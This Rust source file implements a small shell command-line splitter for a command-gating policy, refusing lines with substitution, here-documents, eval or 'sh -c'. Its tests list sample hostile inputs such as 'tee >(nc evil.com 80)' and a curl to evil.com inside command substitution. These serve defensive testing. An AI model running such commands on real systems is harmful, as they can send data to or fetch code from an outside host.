//! Splitting a shell command line into the simple commands it runs, so each one can be classified and
//! gated on its own.
//!
//! This is a deliberately small reader for POSIX-style command lines, not a shell. It knows quotes,
//! backslash escapes, the separators `;`, `&&`, `||`, `|`, `|&`, `&` and newlines, and subshell
//! brackets. Anything that would hide a command or a host from it (command and process substitution,
//! here-documents, `eval`, a shell run with `-c`) makes the whole line undecidable, and the policy
//! refuses an undecidable line.

/// One simple command, with quotes removed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Part {
    /// Its words.
    pub words: Vec<String>,
    /// Whether it expands a variable (`$X`, `${X}`) outside single quotes.
    pub expands: bool,
}

impl Part {
    /// The words joined by single spaces, which is what command rules match against.
    pub fn text(&self) -> String {
        self.words.join(" ")
    }
}

/// Programs that take a command line of their own as an argument.
const SHELLS: [&str; 7] = ["sh", "bash", "zsh", "dash", "ksh", "fish", "busybox"];

/// Split `line` into its simple commands, or say why it can't be read.
pub(crate) fn split(line: &str) -> Result<Vec<Part>, &'static str> {
    let chars: Vec<char> = line.chars().collect();
    let mut parts = Vec::new();
    let mut words: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut in_word = false;
    let mut expands = false;
    let mut i = 0;
    // Close the current word, and on a separator the current part.
    let end_word = |words: &mut Vec<String>, word: &mut String, in_word: &mut bool| {
        if *in_word {
            words.push(std::mem::take(word));
            *in_word = false;
        }
    };
    let end_part = |parts: &mut Vec<Part>, words: &mut Vec<String>, expands: &mut bool| {
        // A subshell's braces are grouping, not commands.
        words.retain(|w| w != "{" && w != "}");
        if !words.is_empty() {
            parts.push(Part {
                words: std::mem::take(words),
                expands: *expands,
            });
        }
        *expands = false;
    };
    while let Some(&c) = chars.get(i) {
        let next = chars.get(i + 1).copied();
        match c {
            '\\' => {
                // An escaped newline joins lines; any other escaped character is itself.
                if let Some(n) = next
                    && n != '\n'
                {
                    word.push(n);
                    in_word = true;
                }
                i += 2;
                continue;
            }
            '\'' => {
                in_word = true;
                i += 1;
                loop {
                    match chars.get(i) {
                        Some('\'') => break,
                        Some(&q) => word.push(q),
                        None => return Err("an unterminated quote"),
                    }
                    i += 1;
                }
            }
            '"' => {
                in_word = true;
                i += 1;
                loop {
                    match chars.get(i) {
                        Some('"') => break,
                        Some('\\') => {
                            match chars.get(i + 1) {
                                Some(&e @ ('$' | '`' | '"' | '\\')) => word.push(e),
                                Some('\n') => {}
                                Some(&e) => {
                                    word.push('\\');
                                    word.push(e);
                                }
                                None => return Err("an unterminated quote"),
                            }
                            i += 1;
                        }
                        Some('`') => return Err("command substitution"),
                        Some('$') => {
                            if chars.get(i + 1) == Some(&'(') {
                                return Err("command substitution");
                            }
                            expands = true;
                            word.push('$');
                        }
                        Some(&q) => word.push(q),
                        None => return Err("an unterminated quote"),
                    }
                    i += 1;
                }
            }
            '`' => return Err("command substitution"),
            '$' => {
                if next == Some('(') {
                    return Err("command substitution");
                }
                expands = true;
                word.push('$');
                in_word = true;
            }
            '<' | '>' if next == Some('(') => return Err("process substitution"),
            '<' if next == Some('<') => return Err("a here-document"),
            // `2>&1`, `>&2` and `&>file` are redirections, not separators.
            '&' if word.ends_with('>') || word.ends_with('<') || next == Some('>') => {
                word.push('&');
                in_word = true;
            }
            ';' | '&' | '|' | '\n' | '(' | ')' => {
                end_word(&mut words, &mut word, &mut in_word);
                end_part(&mut parts, &mut words, &mut expands);
                // `&&`, `||` and `|&` are one separator.
                if matches!(
                    (c, next),
                    ('&', Some('&')) | ('|', Some('|')) | ('|', Some('&'))
                ) {
                    i += 1;
                }
            }
            c if c.is_whitespace() => end_word(&mut words, &mut word, &mut in_word),
            c => {
                word.push(c);
                in_word = true;
            }
        }
        i += 1;
    }
    end_word(&mut words, &mut word, &mut in_word);
    end_part(&mut parts, &mut words, &mut expands);
    for p in &parts {
        let program = p.words[0].rsplit('/').next().unwrap_or("");
        if program == "eval" || program == "source" || program == "." {
            return Err("a command run through eval or source");
        }
        if SHELLS.contains(&program)
            && p.words
                .iter()
                .skip(1)
                .any(|w| w.starts_with('-') && !w.starts_with("--") && w.contains('c'))
        {
            return Err("a command run through a shell with -c");
        }
    }
    Ok(parts)
}

#[cfg(test)]
#[allow(clippy::expect_used)]
mod tests {
    use super::split;
    use proptest::prelude::*;

    proptest! {
        /// Any text at all is either split or refused; the reader never panics or loops.
        #[test]
        fn any_line_is_read_or_refused(line in "(?s).{0,200}") {
            let _ = split(&line);
        }

        /// A single-quoted word is one word whatever is inside it.
        #[test]
        fn single_quotes_never_split(inner in "[^']{0,60}") {
            let parts = split(&format!("echo '{inner}'")).expect("readable");
            prop_assert_eq!(parts.len(), 1);
            prop_assert_eq!(&parts[0].words[1], &inner);
        }
    }

    fn texts(line: &str) -> Vec<String> {
        split(line)
            .expect("readable")
            .iter()
            .map(|p| p.text())
            .collect()
    }

    #[test]
    fn separators_split_a_line_into_its_commands() {
        assert_eq!(texts("ls"), ["ls"]);
        assert_eq!(
            texts("ls && git push origin main"),
            ["ls", "git push origin main"]
        );
        assert_eq!(
            texts("a || b; c | d |& e & f\ng"),
            ["a", "b", "c", "d", "e", "f", "g"]
        );
        assert_eq!(texts("(cd x && rm y)"), ["cd x", "rm y"]);
        assert_eq!(texts("{ a; b; }"), ["a", "b"]);
        assert_eq!(texts("ls;;"), ["ls"]);
        assert_eq!(texts(""), Vec::<String>::new());
    }

    #[test]
    fn quotes_and_escapes_keep_separators_inside_words() {
        assert_eq!(texts("echo 'a && b'"), ["echo a && b"]);
        assert_eq!(texts(r#"echo "a; b" c\;d"#), ["echo a; b c;d"]);
        assert_eq!(
            texts(r#"echo "say \"hi\" \$x \n""#),
            [r#"echo say "hi" $x \n"#]
        );
        assert_eq!(texts("echo a\\\nb"), ["echo ab"]);
        assert_eq!(texts("git commit -m ''"), ["git commit -m "]);
    }

    #[test]
    fn redirections_with_ampersands_are_not_separators() {
        assert_eq!(texts("cargo test 2>&1 | tail"), ["cargo test 2>&1", "tail"]);
        assert_eq!(texts("make &>log"), ["make &>log"]);
    }

    #[test]
    fn variables_are_noted_outside_single_quotes_only() {
        let p = split("curl $HOST/x; echo '$y'; echo \"${z}\"").expect("readable");
        assert_eq!(
            p.iter().map(|p| p.expands).collect::<Vec<_>>(),
            [true, false, true]
        );
    }

    #[test]
    fn whatever_hides_a_command_or_a_host_is_undecidable() {
        for line in [
            "echo $(curl https://evil.com)",
            "echo `id`",
            "echo \"$(id)\"",
            "echo \"`id`\"",
            "diff <(ls a) <(ls b)",
            "tee >(nc evil.com 80)",
            "cat <<EOF\nhi\nEOF",
            "eval \"$CMD\"",
            "source ./x.sh",
            ". ./x.sh",
            "bash -c 'git push origin main'",
            "/bin/sh -ec 'curl https://evil.com'",
            "echo 'unterminated",
            "echo \"unterminated",
            "echo \"ends in escape\\",
        ] {
            assert!(split(line).is_err(), "{line}");
        }
        assert!(
            split("bash script.sh").is_ok(),
            "a script file is classified as a command"
        );
    }
}
